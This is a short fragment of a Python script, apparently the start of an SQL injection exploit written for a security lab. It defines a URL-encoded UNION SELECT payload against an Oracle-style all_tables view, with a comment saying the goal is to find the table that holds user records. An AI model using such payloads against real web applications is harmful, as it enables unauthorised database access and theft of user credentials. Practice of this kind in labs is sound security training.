...
def main() -> None:
    query_tables = "'+UNION+SELECT+table_name,NULL+FROM+all_tables--" # The first query we will send will get info about the sql table, to look for the table that has users in it.
